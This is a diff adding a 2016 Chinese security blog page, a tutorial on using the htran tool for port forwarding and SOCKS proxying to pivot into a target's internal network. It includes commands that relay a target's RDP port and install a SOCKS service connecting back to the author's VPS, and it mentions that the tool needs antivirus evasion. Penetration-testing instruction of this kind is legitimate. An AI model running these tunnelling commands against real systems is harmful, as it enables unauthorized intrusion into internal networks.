@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="通向彼岸 之内网代理转发 [ htran篇 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>通向彼岸 之内网代理转发 [ htran篇 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/10/htran-portforward/">
+                通向彼岸 之内网代理转发 [ htran篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/port-forward/">port forward</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br></p>
+<h3 id="htran-另一款要比lcx好用很多的端口转发及socks代理工具"><a href="#htran-另一款要比lcx好用很多的端口转发及socks代理工具" class="headerlink" title="htran 另一款要比lcx好用很多的端口转发及socks代理工具"></a>htran 另一款要比lcx好用很多的端口转发及socks代理工具</h3><p>1)首先是常规的端口转发功能:<br>1,首先,到vps上监听好指定的端口:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_listen_win.png" alt=""><br></p>
+<p>2,然后,在回到目标机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251(实际测试中应该是自己vps的ip) 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_slave_win.png" alt=""><br></p>
+<p>3,最后,再在vps本地用指定的工具连接到转发到本地的端口上,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_listen_win_1.png" alt=""><br><br><img src="/img/htran_listen_win_2.png" alt=""><br><br><br><br></p>
+<p>2)另一个比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
+<p>1,先在目标机器上安装并启动socks5服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -install</span></div><div class="line"><span class="comment"># HTran2.4.exe -start</span></div><div class="line"><span class="comment"># htran -remove  不用时,卸掉即可</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_install_start.png" alt=""><br></p>
+<p>2,然后,再回到自己的vps上监听等会要连回来的端口,这里-s的意思表示启用socks代理,而-p表示只进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_listen.png" alt=""><br></p>
+<p>3,上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251 1080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_connect.png" alt=""><br></p>
+<p>4,连接建立以后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具(当然,你用别的也一样),然后再工具设置中填写好vps的ip和socks代理的端口(这里是1234这个端口),不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""><br></p>
+<p>5,最后,在把自己常用的一些内网渗透工具加到该代理工具中,就可以进行正常内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""><br><br><br></p>
+<h4 id="关于htran"><a href="#关于htran" class="headerlink" title="关于htran:"></a>关于htran:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点就是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/port-forward/">#port forward</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
